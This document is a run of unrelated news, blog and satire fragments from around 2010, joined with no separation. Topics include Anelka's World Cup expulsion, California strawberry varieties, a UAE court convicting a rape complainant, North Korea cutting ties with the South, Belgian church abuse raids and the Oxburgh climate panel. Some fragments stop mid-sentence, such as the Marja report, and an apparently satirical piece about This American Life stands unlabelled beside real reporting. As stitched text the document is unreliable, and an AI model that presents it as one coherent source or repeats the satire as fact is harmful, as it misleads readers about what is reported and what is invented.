In 2006 , Comedy Central prevented Stone and Parker from showing an image of Muhammad in an episode designed to comment on the Danish Prophet Muhammad cartoon , which sparked worldwide protests .
The majority of Muslims consider any physical representation of their prophet to be blasphemous .
Comedy Central declined to comment on the latest controversy .

The Open Source Movement , typically covers Open Hardware , Open Firmware , and Open Software .
Open Hardware is similar to Free and Open Source Software .
The Open Firmware movement provides firmware ( i.e. : micro- code specifically related to the subcoding of hardware devices ) which you may also know as soft - IP or FPGA coding see Open Cores for more details .
Excellent examples of specific Open Hardware projects are listed on our Projects page .
Discussions of more general open - hardware ideas are on a few pages here , such as open source electronics , Ideas , Meta Open Source , etc .
Just as many important pieces of open - source software are , in turn , used to develop software ( including more open - source software ) , many important open - hardware devices are , in turn , used to develop hardware devices ( including more open - hardware devices ) -- such as Oscilloscope # Open Source Oscilloscopes .
There 's also a bit of crossover , in that software tools ( many of them open - source software ) are often used to develop open - source hardware .

MARJA , Afghanistan —
Since their offensive here in February , the Marines have flooded Marja with hundreds of thousands of dollars a week .
The tactic aims to win over wary residents by paying them compensation for property damage or putting to work men who would otherwise look to the Taliban for support .
The approach helped turn the tide of insurgency in Iraq .
But in Marja , where the Taliban seem to know everything — and most of the time it is impossible to even tell who they are — they have already found ways to thwart the strategy in many places , including killing or beating some who take the Marines ’ money , or pocketing it themselves .
Just a few weeks since the start of the operation here , the Taliban have “ reseized control and the momentum in a lot of ways ” in northern Marja , Maj .

France striker Nicolas Anelka has been expelled from his country 's squad and sent home from South Africa after refusing to apologise for an astonishing verbal attack on coach Raymond Domenech at half - time of Thursday 's 2 - 0 defeat to Mexico .
The player has been ordered to go home by a French Football Federation disciplinary committee which convened this afternoon and will leave the country tonight .
The Chelsea forward was not at training today and was asked to apologise by French Football Federation president Jean - Pierre Escalettes .
Upon refusing to do so , was asked to leave the squad .
" He will leave the Team France camp this evening , " said an FFF statement .
The Chelsea forward , who has now not recorded a shot on target in 429 consecutive minutes ' play for Les Bleus , was apparently criticised by Domenech for straying out of position during a goalless first half .
According to French sports newspaper L'Equipe Anelka exploded in rage in the dressing room , verbally abusing the coach .
He is reported to have said , " Go fuck yourself you son of a whore . "
L'Equipe claim Domenech responded by substituting the player .
The coach returned to the team 's dug - out for the second half at the Peter Mokaba Stadium in Polokwane a good minute or so before his players came out of the tunnel .
Anelka was replaced by Andre - Pierre Gignac before the restart .
The reported bust - up is just the latest in what has been a string of rumours about unrest within the France camp and claims Domenech has lost the support of his players .
The under - fire Domenech has brushed aside concerns rivals Uruguay and Mexico may manufacture a draw in their final Group A match to ensure they progress to the knockout stages at the expense of Les Bleus .
France have to convincingly beat hosts South Africa on Tuesday and hope there is a positive result in the other fixture .
With so much at stake it has been suggested the two teams from the Americas are more likely to settle for a stalemate rather than risk elimination .
It is not something which concerns Domenech , who has plenty of problems of his own to deal with .
" I am not bothered about the others , " said the 58 - year - old , whose six - year reign as coach will come to end at the same time as France 's participation in the tournament .
" We have to play and do our thing and the other match is not my problem . "
The midfielder Jeremy Toulalan , who is suspended for the South Africa game , hinted that dressing - room disharmony were at the heart of France 's problems .
But he admits it is time for the players to start delivering after two woeful and goalless performances .
" We 've three or four days left to figure out what went wrong , " he said .
" You can talk for a long time but it 's the pitch that counts .
But if we do n't all make the effort for each other it 's hard .
Everyone has to do their own self - analysis .
I 'm not going to do it for them . "
Earlier today , French Football Federation vice - president Christian Teinturier said if there was any basis to the reports about Anelka then he should be sent home from the tournament immediately .
" If the words we have just heard have been used , he has nothing to do there [ at the World Cup ] , " Teinturier told France Info radio .

The mild climate along California ’s coast enables its strawberry growers to dominate commercial production of this fruit ; last year they accounted for some 88 % of the nation ’s crop .
For strawberry lovers , that ’s both a blessing , of abundance and reasonable prices , and a curse , because local growers are focused almost exclusively on varieties suited to industrial production .
Compared with other states where local sales predominate , California strawberry breeders prioritize firmness and long shelf life , often at the expense of flavor .
Our farmers market growers can offer riper fruit than is harvested for supermarkets , but they are stuck using commercial varieties because no one in California is breeding new varieties suited for direct sales and nurseries , for the most part , do n’t want to be bothered with older varieties .
That ’s a shame because there ’s a whole world of different and extraordinary flavors that could await enterprising growers and their customers .
Last week , I wrote a buying guide to farmers market strawberries focused on standard varieties from the University of California breeding program .
Let us now consider specialty and exotic strawberry varieties , both from farmers markets and further afield .
My favorite strawberry variety in the market right now is Galante , grown by Jerry Rutiz in Arroyo Grande , on the Central Coast , which he sells at the Santa Monica Wednesday farmers market ( $ 3.50 a basket ) .
Deep orange - red when fully ripe , its most remarkable qualities are its texture , which is delicate and juicy , and its intense flavor , which has hints of melon .
Bred by David Small of California Giant and introduced about six years ago , it has not succeeded as a commercial variety because the berries bruise easily and they rot quickly after rainstorms — particularly Rutiz ’s crop , which is unsprayed .

Alpine strawberries , also called “ wild ” strawberries or fraises des bois , are a different species ( Fragaria vesca ) , much smaller , softer and more aromatic than most varieties of the common garden strawberry ( F. ananassa ) .
A romantic allure accompanies them , but they ’re only at their best when fully developed and ripe ; underripe fruits are sour , overripe ones are mushy , and tiny , scrawny specimens covered with seeds are bitter .
Their shelf life is the blink of an eye , and they ’re insanely laborious to pick , so just a few growers raise them , notably Pudwill Berry Farms of Nipomo and Jaime Farms of City of Industry , which mainly sell these fragile berries at Santa Monica Wednesday .
Pudwill recently cut back their plants and wo n’t have wild strawberries for another month or so ; Jaime will have them through June or July , but in small quantities , which tend to be scooped up by purveyors for restaurants , so one must stop by as the market opens or reserve in advance .
Really , the ideal approach is to grow one ’s own ; Michael Wellik of the Strawberry Store in Delaware , an unparalleled resource , sells plants and seed of 20 varieties .
Mara des Bois , a cultivated strawberry introduced by the Marionnet nursery in France in 1991 , contains high levels of methyl anthranilate , the volatile compound that perfumes fraises des bois .
Small to medium in size and deep red , with soft , melting flesh , it has such an intense aroma when ripe that many people mistakenly suppose it to be a hybrid of wild and cultivated species .
It ’s the standard of quality for strawberries at French markets , but the only source in Southern California is Chino Nojo , the chic , famously secretive farm north of San Diego ( 6123 Calzada Del Bosque , Rancho Santa Fe ; [ 858 ] 756-3184 ; no website ) .
Both Wellik and Nourse Farms sell the plants .
When will farmers market growers catch on ?
The modern strawberry ( F. ananassa ) originated in Europe in the 18th century from chance crosses of two wild species , the Virginian and Chilean , inheriting from the former hardiness , sharp flavor and redness .
Virginian strawberries are almost never cultivated for sale as fresh fruit , but one can enjoy their essence in the exquisite Tiptree Little Scarlet strawberry jam made by Wilkin & Sons in England , which is available at the Continental Shop in Santa Monica ( $ 13.99 for 12 ounces ) and from various mail - order sources .
For home gardeners , Wellik sells two selections of Virginian .

In the last few weeks there ’s been considerable buzz and a fair bit of confusion , about a white strawberry that supposedly tastes like pineapple , which is being marketed in Europe as the “ pineberry . ”
Some commentators even suspected that the “ news ” was just an April Fool ’s Day publicity stunt .
It was introduced by Hans De Jongh , a farmer in Etten - Leur , the Netherlands , whose family used to grow Little Scarlet , and who now specializes in ultra - high - quality heirloom strawberries , all raised in greenhouses .
“ Its flavor does not resemble pineapples in my opinion , but it ’s very juicy and aromatic , ” he says .
“ The smell is like perfume .
Even if you have only a few strawberries , you can smell them in your whole room . ”
He does not know the original name of this variety , which he obtained from an elderly French strawberry variety collector , but he believes that it dates back to the first generation of crosses between the Virginian and Chilean species in the 18th century .
When he found the original plant it was small and sickly , so he used tissue culture , a laboratory method of propagation , to rid it of disease .
When his marketer , VitalBerry ( a major international berry company ) first offered this oddity to sellers they demurred at the high prices , currently $ 5.40 for 4.4 ounces retail .
“ They said , ‘ Oof , little soft strawberries , we do n’t like it , ’ ” De Jongh remembers .
But in time it caught on with chefs and high - end retailers , and now is sold in small quantities from London to Moscow .

De Jongh has also revived cultivation of a variety with a flavor and aroma even better than that of Mara des Bois , being marketed as strasberry , which he believes may actually be an old German home garden favorite , Mieze Schindler .
Several government and private breeders , domestic and foreign , are now working on developing white strawberries and ultra - high - flavored varieties , for both local and commercial sales , and it seems likely that some will be available here within a few years .
Let ’s hope that California strawberry nurseries and farmers market growers grasp the opportunity to profit by fulfilling the flavor potential of the strawberry , the most noble but sorely abused of berries .
Farmers markets at Coachella and Stagecoach festivals :
In recent years , certified farmers markets have started cropping up at hospitals , schools , and gated communities , so it should not be too surprising that one will be held this weekend at the Coachella Music Festival .
Open only to festival attendees , it will take place Friday through Sunday from 7 a.m. to 2 p.m. near camping areas at the event site , the Empire Polo Grounds ( 81800 Ave. 51 , Indio , Calif . ) ; another market will be held at the Stagecoach Festival on April 24 and 25 .
Farmers will sell a wide range of produce but will focus on refreshing and readily consumable items such as grapefruit juice , orange ices , cucumber salad and date snack bars , says the manager , Paul Palodichuk , who organizes three weekly desert markets .

A court in the United Arab Emirates ( UAE ) has convicted an 18 year old girl ( “ LH ” ) to one year in prison for “ consensual sex . ”
The UAE court convicted her because she agreed to be alone in the car with a man “ YM . ”
As previously reported , the teenage girl had previously alleged that she was gang raped by six men .
the UAE “ The Nation ” newspaper reported that LH had “ 12 bruises ranging from 1 cm to 7 cm long on her upper lip , hands , thighs , knee , and behind her left ear . ”
LH indicated that her brother had beaten her , although the beatings happened at different times .
However , after the teenage girl “ LH ” filed charges of rape , according to the “ The Nation ” on May 25 , “ LH ” was then charged with the crime of “ extramarital sex , ” which could have led to a penalty of “ lashes and a maximum sentence of life in prison , ” with a minimum of three years in prison .
LH then pleaded with the court to allow her to withdraw the rape charges , while one of the accused rapists laughed at her in court .
According to the LA Times , LH appeared before the court “ shackled and clothed in an inmate ’s uniform of hunter green and a black headscarf ” and “ she rescinded the allegations ‘ to get out of ’ jail , Bloomberg Businessweek reported . ”
The UAE court had reportedly considered the lesser criminal charge of “ deception ” against “ LH , ” but chose to convict of “ consensual sex , ” with a sentence of 1 year in prison .
One of the alleged rapists was also convicted of “ consensual sex ” with a sentence of 1 year in prison .
Two of the men were given sentences of three months in prison “ for being alone in the company of a woman . ”
The other men were only given fines .
According to “ The Nation ” that fines represented an application of Sharia law only , whereas the other convictions were a combination of UAE law and Sharia law together .
Human Rights Watch ’s Middle East North Africa researcher Nadya Khalife told the Los Angeles Times that “ The major legal ramification for women who have been raped is that they will most likely be charged with illegal sex or sex outside marriage .
Illicit sex carries a harsh sentence of imprisonment and / or flogging .

Contrary to the belief that Arab women throughout the Middle East do not have access to or interest in the Internet outside of work , the vast majority of Arab women access the web from home , belong to a social networking site and use the Internet to connect with friends , a regional survey by the Gulf - based research group YouGovSiraj has found .
The study into evolving online attitudes and behaviors of Arab women across the Middle East found that 85 percent of Arab women using the Internet access it from home , 71 % belong to a social network and 66 % connect with friends online on a daily basis .
The survey also found 45 % of Arab women online were reading articles and magazines , and 34 % of them were spending at least 10 hours a week browsing the Internet outside of work .
The study conducted in April and released on Sunday , surveyed over 1,250 women from Jordan , Syria , Lebanon , Egypt , Saudi Arabia , Kuwait , Oman , Qatar , Bahrain and the United Arab Emirates .
Lebanon held the highest online usage for women with 68 % of those surveyed spending more than seven hours a week online outside of work , followed by the UAE at 55 % , Kuwait 53 % , Egypt 50 % , Qatar 47 % , Saudi Arabia and Jordan 44 % , Bahrain 42 % , Syria 34 % and Oman 30 % .
The study found Facebook to be the leading social networking platform among Arab women , with an estimated 91 % of online Lebanese women having a Facebook account , followed by 80 % of online women in Egypt , 78 % in the UAE , 70 % in Jordan , 68 % in Kuwait and Qatar , 66 % in Bahrain , 64 % in Saudi Arabia , 55 % in Oman and 45 % in Syria .
“ This was a huge study , ” Lara Al Barazi , Research Manager at YouGovSiraj told The Media Line .
“ We combined quantitative and qualitative approaches to better understand Arab women ’s lives online : how they access the Internet , what kind of websites and information they look at , what role it plays in their lives , and what they do when they are done .
”
“ You have to remember that these people are already connected , ” she said .
“ So this was not a study into how many Arab women connect to the Internet , it was a study into what Arab women who are already connected are doing online .
” The study was commissioned by anaZahra.com , a new website on Arab women ’s lifestyles set to be launched next month by the Abu Dhabi Media Company , creator of the international English - language daily The National .
The site will target Arabic - speaking women across the Middle East interested in fashion , beauty , celebrity news and various lifestyle topics .
“ Everyone believes Arab women are not as interested in digital content as they are in reading magazines , but we discovered that the Internet plays an integral part of Arab women ’s lives , whether they are living in different parts of Saudi Arabia or a city in the UAE , ” Zoya Sakr , Managing Director of anaZahra.com told The Media Line .
“ Arab women are getting really into digital stuff .
” “ Arab women regularly consult the Internet , both during the week and on the weekends , but there is a lack of portals that offer high - quality content in Arabic for them , ” she said .
“ There is almost no competition , as the portals that exist are very traditional or local .
So if you ask Arab women where they go for fashion and beauty , they say that they consult international websites .
” “ We will have original content from over a dozen editors , with contributors in London , Lebanon , Syria , Egypt and the Gulf , ” she said .
“ We want women to inspire women .
” Sakr said web developers and entrepreneurs throughout the region were slowly waking up to the already large and growing female audience .
“ Women 's community sites are a key growth sector online globally , ” said Sakr .
“ Women are an important audience segment for content creators and marketers : they are expressive and they are connected .
They like sharing with their friends and family and they are eager to engage with other women .
” “ There is no doubt the world is going digital and this results in major changes in our daily habits , from socializing to entertainment , " said Ricky Ghai , Executive Director of Digital Media at the Abu Dhabi Media Company .
“ This is especially true when it comes to modern Arab women , who have become more and more interested and involved in the digital space . ”

Are you listening to me ?
Scientists find blinking eyes mean the mind is wandering
Ever get the feeling that the person you ’re talking to is n’t being entirely attentive ?
Now you can tell for certain – because scientists have found a way to prove whether someone is listening to you .
All it takes is a look into their eyes .
When a person blinks , it is a sign that their mind is wandering , a study shows .
The researchers think that blinking sets up tiny physical barriers that help to shut off the outside world .
Is your partner really listening ?
How often they blink is a telling sign .
( Posed by models )
They were inspired by studies showing that when attention falters , parts of the brain that process external influences are less active .
‘ We thought , OK , if that ’s the case , maybe we ’d see that the body would start to do things to prevent the brain from receiving external information , ’ said neuroscientist Dr Daniel Smilek , from the University of Waterloo - in Ontario , Canada .
‘ The simplest thing that might happen is you might close your eyes more . ’
To test the theory , 15 volunteers were asked to read from a computer screen while a sensor tracked their eye movements , recording any blinks .
At random intervals , the computer beeped and the subjects reported whether they had been paying attention to what they were reading or whether their minds were wandering .
The volunteers were found to blink more when they were n’t paying attention .
‘ What we suggest is that when you start to mind - wander , you basically close your eyelid so there ’s less information coming into the brain , ’ said Dr Smilek .
The research is reported in the journal Psychological Science .
Previous studies have shown that people blink more when lying .
CHICAGO — Producers of the long - running Chicago Public Radio program
This American Life announced Monday that they have completed their comprehensive 12 - year survey of life as a modern upper - middle - class American .
Ira Glass compares completing the series to finding out he is a relative of composer Philip Glass .

In what cultural anthropologists are calling a " colossal achievement " in the study of white - collar professionals , the popular radio show has successfully isolated all 7,442 known characteristics of college graduates who earn between $ 62,500 and $ 125,000 per year and feel strongly that something should be done about global warming .
" We 've done it , " said senior producer Julie Snyder , who was personally interviewed for a 2003 This American Life episode , " Going Eclectic , " in which she described what it 's like to be a bilingual member of the ACLU trained in kite - making by a Japanese stepfather .
" There is not a single existential crisis or self - congratulatory epiphany that has been or could be experienced by a left - leaning agnostic that we have not exhaustively documented and grouped by theme . "

Added Snyder , " We here at public radio could n't be more pleased with ourselves . "
The final episode , which explored the universal tribulations of having to live with roommates again in one 's mid-30s after a divorce , provided an apt bookend for the project .
The completed work is expected to be an indispensable source of information for years to come about the thoughts and tastes of bespectacled cynics prone to neuroses who are actually doing just fine .

This American Life host and producer Ira Glass began work on the project in 1995 in Chicago , where he found himself inspired by and catering to an audience of professionals who dine out frequently and have a hard time getting angry .
Glass and his team of producers , writers , and interns set about the exhausting task of gathering all available information on a range of subjects from minor skirmishes with the law to the rewards of occasionally talking to poor people .
The raw data was then analyzed , deconstructed , reconstructed , re-deconstructed , organized under a broad philosophical title , and interspliced with musical interludes by rock duo They Might Be Giants .

Though This American Life is now lauded as the definitive source for material about getting an autistic teenager admitted to Harvard , its early run was marked by painful trial - and - error , according to producer Alex Blumberg .
" At first , we were getting a lot of stories from recovered drug addicts and East African refugees living in the States , which had their compelling elements but came off a bit cloying , " Blumberg said .
" But then we realized that if we had overeducated people with voices rather unsuitable for radio narrate the stories with clever analogies and accessible morals , the whole thing would come off far less depressing . "
Advertisement
Blumberg said that the turning point came in 1997 , when producers discovered a group of inner-city schoolchildren inadvertently teaching an important lesson to their attractive , suburban - raised teacher about what makes us human .
Also aiding the study were the many contributors to This American Life , who took time from their best - selling essay - writing careers to donate personal anecdotes about dropping out of prestigious art schools , taking harrowing but poignant childhood vacations to the Grand Canyon , and the unique challenges of growing up in families supportive of their homosexuality .
Advertisement
On Sunday , writer and contributing editor Sarah Vowell called the project 's end " oddly anticlimactic , " but questioned whether work was actually complete because the show had not yet addressed the subject of " Things Ending . "
" Seeing this project through to its culmination was equally satisfying and strange , " said Vowell , speaking at a book signing in Colonial Williamsburg dressed as Betsy Ross .
" I feel not unlike the early Pilgrims , who , standing atop Plymouth Rock after a long and arduous sea voyage , reflected on their journey , perhaps thinking to themselves ' For God 's sake — does n't anybody have anything to eat in this settlement ? ' "
Advertisement
Glass , who personally contributed over 2,000 anecdotes from his own life for documentation , called the project 's conclusion the " end of an era . "
" When we finished , I have to tell you , I felt something I never expected : a profound sense of contentment — maybe even relief , " Glass said .
" Afterwards , the other producers and I sat around for a long while , remarking on how interesting and strange it was to finally complete the study , and how perhaps it is , in some way , symbolic of life in general . "
SEOUL ( Reuters ) - North Korea said on Tuesday it was cutting all ties with the South and threatened its wealthy neighbor with military action over alleged violations of its waters off the west coast .
The comments marked a new high in tensions on the divided peninsula after the March sinking of a South Korean warship , which Seoul blames on a torpedo fired by the communist North .
The increasingly war - like rhetoric hit Seoul ’s financial markets , prompting policymakers to call an emergency meeting on Wednesday to look for ways to calm investors .
“ The Committee for the Peaceful Reunification of Korea .... formally declares that from now on it will put into force the resolute measures to totally freeze the inter-Korean relations , totally abrogate the agreement on non-aggression between the north and the south and completely halt the inter-Korean cooperation , ” the North ’s KCNA news agency reported .
North Korea will also expel personnel from the Kaesong industrial park , a joint North - South venture just inside its border .
It was not immediately clear what impact that would have on factories there .
The industrial estate , in which South Korean firms employ cheap North Korean labor , is an important source of revenue for the Pyongyang leadership .
North Korea earlier said if the South continued to cross into its side of the disputed sea border -- the scene of deadly clashes in the past -- the North would “ put into force practical military measures to defend its waters . ”
The North referred to the South ’s government as “ military gangsters , seized by fever for a war ” .
A report by international investigators last week accused the communist North , already under international pressure over its nuclear program , of torpedoing the Cheonan corvette in March , killing 46 sailors .
On Monday , South Korean President Lee Myung - bak cut trade with his impoverished neighbor and blocked its commercial ships from sailing through the South ’s waters .
He also plans to take the issue to the U.N. Security Council .
U.S. Secretary of State Hillary Clinton said in China on Tuesday that Washington and Beijing would work together to come up with an “ effective , appropriate ” response to the sinking , which Washington condemned .
Clinton said both sides should examine the issue over time , suggesting quick Security Council action was unlikely .
“ ( China ) shares with us the goal of a denuclearised Korean Peninsula and a period of careful consideration in order to determine the best way forward in dealing with North Korea . ”
In Washington , State Department spokesman P.J. Crowley called Pyongyang ’s approach “ odd . ” “ I ca n’t imagine a step that is less in the long term interest of the North Korean people than cutting off further ties with South Korea , ” he said .
RUSSIA SEEKS RESTRAINT
Russia , which like China and the United States holds a veto in the Security Council , urged restraint .
China , the North ’s only major ally and which effectively bankrolls its economy , has studiously tried to keep out of the fray , urging calm and refusing to voice support for the international report on the Cheonan sinking .

It means that South Korea has almost no chance of winning further U.N. sanctions against its neighbor .
The issue is certain to dominate talks in Seoul on Wednesday with Clinton , who was arriving after talks in Beijing .
Most analysts doubt either side would risk a war , which would be suicidal for the North and economy - ruining for the South .
Seoul ’s key economic and financial authorities will meet early on Wednesday to discuss ways to stabilize local financial markets .

Some in the market saw the selling -- which took stocks on the main index to their lowest close in 15 weeks -- as overdone and triggered mostly by foreign selling .
“ North Korea and related risks have always been there .
It is like telling investors to quit the Japanese market because it has earthquakes .
War is wanted neither by the North nor the South , ” one fund manager at a foreign investment management house said .
FURIOUS RHETORIC
Both sides have stepped up their rhetoric over the Cheonan incident , one of their deadliest since the 1950 - 53 Korean War .
The North accused South Korea ’s government of fabricating the issue , partly to help the ruling party in next week ’s local elections -- important to cement President Lee ’s power in the second half of his single five - year term .
The incident appears to have done nothing to dent Lee ’s popularity , which one recent opinion poll shows running at well over 40 percent , unusually high for recent South Korean presidents halfway through their term .
A strong showing for Lee ’s party in the June 2 local election , which many expect , will give him greater authority to push aside a fragmented opposition in parliament and continue with sweeping pro-business reforms .
His rule has also seen relations with the North turn increasingly chilly as he turned his back on a decade of generous aid to the North by his predecessors which had failed to end its attempts to build nuclear weapons .
Some worry pushing North Korean leader Kim Jong - il too far may leave him little choice but to fight back to try to save his family ’s more than 60 - year hold over the destitute country as he tries to secure the succession for his youngest son .
Analysts say the main risk is that small skirmishes along the heavily armed border could turn into broader conflict .
The widespread love of " Lost " among comics creators has been well documented , from Faith Erin Hicks ' sketch work to Travis Pitts ' Charlie Brown John Locke , and that love did not diminish leading up to last night 's series finale on ABC .
Even if the show 's conclusion left the world with no more new episodes to look look forward to , it did leave us with at least one gallery 's worth of tribute artwork .
It turns out that J. Scott Campbell , who enjoys drawing naughty Disney princesses , also has at least a passing fascination with Sawyer .
Even funnyman cartoonist Graham Annable has put in some hours drawing " Lost " scenes , and you may already be familiar with the brilliant minimalist commentary of Kate Beaton 's " Lost " comics .
Whichever character you were rooting for Sunday night , whether it was Hugo , Locke , Jin , Sawyer , or perhaps even Ben ( you terrible , terrible human being ) , chances are they 've been drawn by someone in the comics world or at least turned into a custom action figure .
Click past the jump and you 'll find some of the most memorable " Lost " homages to hit the comics and indie art scenes over the past six seasons .

Victims groups say Vatican criticism of police shameful , as pontiff calls raid deplorable and demands church role in investigations
This article is more than 10 years old
This article is more than 10 years old
Groups representing the victims of clerical abuse tonight expressed outrage after the pope criticised raids on the Catholic church by Belgian police .
Last week , police raided the home of a retired bishop , opened the grave of at least one archbishop and detained Belgium 's nine current serving bishops as they met , seizing their mobile phones and only releasing them after nine hours .
Pope Benedict described the raids by officers investigating abuse claims as " surprising and deplorable " and demanded that the church be allowed a role in inquiries into child molesters in its ranks .
In a message to the head of the Belgian bishops ' conference , Monsignor André - Joseph Léonard , the pontiff condemned the raids and offered his support to the bishops " in this sad moment " .
" I want to express , dear brother in the episcopate , as well as to all the bishops of Belgium , my closeness and solidarity in this moment of sadness , in which , with certain surprising and deplorable methods , searches were carried out , " he said .
" I hope that justice will follow its course while guaranteeing the rights of individuals and institutions , respecting the rights of victims , [ and ] acknowledging those who undertake to collaborate with it . "
The Vatican has also protested to Belgium 's ambassador to the Holy See. Yesterday , Cardinal Tarcisio Bertone , the Vatican secretary of state , said : " There are no precedents for this , not even under communist regimes . "
But the raids were welcomed by the American clerical abuse victims group Snap .
" Vatican officials who criticise the Belgian police raid of the Brussels church hierarchy should be ashamed of themselves , " said Joelle Casteix of Snap .
" While Roman church officials talk about stopping abuse , Belgian police officials take action to stop abuse . "
As cases of abuse by priests have emerged throughout Europe this year , the Belgian church has apologised for failing to root out abusers in the past and promised a crackdown .
On Friday , the pope appointed Monsignor Jozef De Kesel as the bishop of Bruges to replace Roger Vangheluwe , 73 , who resigned in April over abusing a boy .
Vangheluwe was the first European bishop to step down after confessing to abuse .
As part of their investigation into recent claims of abuse , police last week drilled into the tombs of two archbishops at the cathedral in Mechelen , north of Brussels , using cameras to look for hidden documents , a church official said .
Investigators said only one tomb had been opened .
Léonard condemned the raid as being inspired by " crime novels and the Da Vinci Code " .
Police took documents and a computer from the home of his predecessor , Godfried Danneels , and seized documents from an independent panel investigating 500 cases of suspected abuse by priests .
After initially treating the abuse revelations emerging in Europe as a plot to discredit the church , Vatican officials have increasingly admitted the need for it to co-operate more closely with police .
But in his reaction to the Belgian raids , the pope stressed that abuse within the church needed to be handled by both civil and canon law , " respecting their reciprocal specificity and autonomy " .
Avvenire , the newspaper of the Italian Bishops ' Conference , went further , claiming the police investigation went " beyond the legitimate requirements of justice " and was the sign of a secular government 's " desire to attack the church in its entirety " by a secular government .
Mark Holick Named Head Coach Of Syracuse Crunch
May 21 , 2010 - American Hockey League ( AHL ) - Syracuse Crunch News Release
Syracuse , NY ( May 21 , 2010 ) - The Syracuse Crunch announced today that the Anaheim Ducks have named Mark Holick the Crunch 's head coach .
" With 16 years of coaching experience , Mark Holick has the proven track record we were looking for , " said Ducks Executive Vice President / General Manager Bob Murray .
" He had three great seasons in the WHL , including earning Coach of the Year honors in 2009 - 10 , and is certainly qualified to take the next step . "
Holick , 41 , comes to the Crunch after leading the Western Hockey League 's ( WHL ) Kootenay Ice for the last three seasons , compiling a cumulative 120 - 75 - 10 - 11 ( W - L - OTL - SOL ) record while leading the club to the WHL playoffs in each of his years at the helm .
Most recently , Holick guided Kootenay to a 43 - 24 - 3 - 2 record during the 2009 - 10 season , earning the prestigious Dunc McCallum Memorial Trophy as the WHL's Coach of the Year , joining past winners such as current NHL head coaches Cory Clouston ( Ottawa ) , Todd McLellan ( San Jose ) and Brent Sutter ( Calgary ) and former NHL bench bosses Kevin Constantine , Don Hay , Ken Hitchcock and Tom Renney .
He also served as an assistant coach on Canada 's 2009 - 10 National Men 's Under - 18 team .
Prior to his time in Kootenay , Holick spent 13 years as either a head or assistant coach in both the British Columbia Hockey League ( BCHL ) and Alberta Junior Hockey League ( AJHL ) with Vernon ( BCHL , 2006 - 07 ) , St. Albert / Spruce Grove ( AJHL , 2003 - 06 ) , South Surrey ( BCHL , 1996 - 2002 ) , Langley ( BCHL , 1995 - 96 ) and Penticton ( BCHL , 1994 - 95 ) .
Holick was the head coach of the 1997 - 98 South Surrey squad that won the coveted Royal Bank Cup as the Canadian ' Junior A' Champions .
In addition to his coaching career , Holick played professionally in parts of four seasons from 1989 - 94 , appearing in 142 total games with Adirondack ( AHL ) , Louisville ( ECHL ) and Dallas ( CHL ) , recording 30 goals , 43 assists and 635 penalty minutes .
A native of Saskatoon , Saskatchewan , the former right wing appeared in 165 combined WHL games with Saskatoon and New Westminster from 1984 - 88 , compiling 10 goals , 20 assists and 287 penalty minutes .
Holick was selected by Toronto in the 11th round , 216th overall , in the 1986 NHL Entry Draft .
Holick becomes the fifth head coach in Crunch history ( Jack McIlhargey , 1994 - 99 , Stan Smyl , 1999 - 00 , Gary Agnew , 2000 - 06 and Ross Yates , 2006 - 10 ) .
On March 25 , 2010 , the Crunch announced a multi- year affiliation with the Anaheim Ducks starting with the 2010 - 11 season .
Anaheim is the third primary affiliate in the Crunch 's 16 - year history .
Season tickets for the 2010 - 11 season are now on sale and can be purchased by calling the Crunch office at ( 315 ) 473-4444 , or by stopping by the Crunch office in the War Memorial at Oncenter , located at 800 South State Street in downtown Syracuse .

This week Swedish police arrested three individuals on suspicion of copyright infringements .
The trio are suspected of having connections to ' Scene ' warez servers known as ' Darkside ' .
According to anti-piracy group Antipiratbyrån , the servers carried huge amounts of data making the case the biggest so far in Sweden , and possibly in Europe .
During the last decade many countries have been revealed as the locations for so - called ‘ Scene ’ warez servers , but none so often as the Scandinavian countries , particularly Sweden and Norway .
This week it is Sweden ’s turn yet again to become the locations for police action against these usually secretive operations .
Following an investigation conducted by anti-piracy group Antipiratbyrån , on Wednesday and Thursday police swooped on four individuals .
Searches were carried out in Stockholm and at two locations in Västerås where servers were found .
Although one individual was later released , the suspects – all men in their forties – are suspected of having connections to the Scene servers known as “ Darkside ” .
According to Henrik Pontén of Antipiratbyrån , the three were responsible for servers which are claimed to house 130tb of both Swedish and foreign movies .
“ Dark Side has a huge capacity , ” Pontén told DN .
“ This is the biggest case we know of to date , certainly the biggest in Sweden , but possibly also in Europe . ”
Antipiratbyrån , who had been monitoring Darkside and gathering IP addresses and other information for some time , handed the investigation over to police in February .
“ [ Wednesday ’s ] police operation was yet another important step to stop organized piracy .
This type of action has a direct and dramatic effect on the number of infringements , ” said Pontén in a statement .
“ By extension , it means that the cultural workers get an opportunity to get paid for their work and we consumers have access to a continuing culture production . ”
According to prosecutor Frederick Ingblad , who was recently involved in the numerous raids against Direct Connect users and is part of a new piracy task - force , there have already been some confessions from those arrested .

Over the course of the day I 've made several telephone calls to the Royal Society , without being able to get a response to the simple question of who it was within their ranks who selected the eleven CRU papers for Lord Oxburgh 's panel to examine .
These papers , you will remember " were selected on the advice of the Royal Society " .
Just after 4 pm I finally got through to the person responsible and seconds later an emailed response arrived as well .
This was fortuitous because I was able to ask some questions on the contents .
So , who was it ?
Here is the Royal Society 's statement :
The Royal Society agreed to suggest to UEA possible members for the Scientific Assessment panel that would investigate the integrity of the research of UEA ’s Climatic Research Unit ( CRU ) .
Members of the panel were suggested on the basis of the excellence of their work and their breadth of expertise and experience ( including statistical capability ) .
The Royal Society recommended that the panel had access to any and all papers that it requested and suggested that the review begin by looking at key publications , which were chosen to cover a broad range of subjects over a wide timescale .
Whoah !
Get that !
They told them only to look at lots of papers .
Not which particular ones ?
With the press officer still on the line , I asked the question : " So you did n't actually advise UEA which papers they should look at ? " and the response was :
" This is the only statement we are willing to make at the moment . "
And I said ,
" So it 's a bit sensitive , then ? "
And the reply was ,
" This is the only statement we are willing to make at the moment . "
So , ladies and gentlemen .
I think we can now say with considerable certainty that Lord Oxburgh 's declaration that he took the advice of the Royal Society as to which papers to examine is not true .
So who did choose them then ?
There 's a clue back at the start of the story of Lord Oxburgh 's panel .
When the investigation was announced , the BBC had this to say :
UEA , in consultation with the Royal Society , has suggested that the panel looks in particular at key publications from the body of CRU 's research which were referred to in the university 's recent submission to the Parliamentary Science and Technology Committee .
We know , of course , that the bit about the Royal Society is not true .
But if you look at the UEA select committee submission , you find in the appendix a list of papers which bears an extraordinary similarity to the list that was looked at by the Oxburgh panel .
If you strike off the non-UEA papers , you seem to be left with only a single discrepancy - the appendix points to Jones et al 1997 ( J Clim ) while the Oxburgh panel looked at Briffa et al 2001 ( JGR ) .
So we have an extraordinary coincidence - that both the UEA submission to the select comittee and Lord Oxburgh 's panel independently came up with almost identical lists of papers to look at , and that they independently neglected key papers like Jones 1998 and Osborn and Briffa 2006 .
